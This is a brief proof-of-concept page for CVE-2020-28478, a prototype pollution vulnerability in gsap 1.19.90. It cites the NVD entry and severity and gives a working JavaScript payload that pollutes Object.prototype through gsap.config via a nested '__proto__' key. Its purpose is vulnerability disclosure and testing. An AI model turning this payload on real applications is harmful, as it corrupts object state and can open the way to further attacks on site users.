
# gsap 1.19.90 PoC / CVE-2020-28478


reference: https://nvd.nist.gov/vuln/detail/CVE-2020-28478


severity: High

Base score: 7.5






## Proof of Concept

gsap.config({ autoSleep: JSON.parse('{"__proto__":{"__proto__":{"polluted":"yes"}}}') });
// gsap.defaults(JSON.parse('{"proto":{"polluted":"yes"}}'));

document.write('Polluted : ' + polluted);
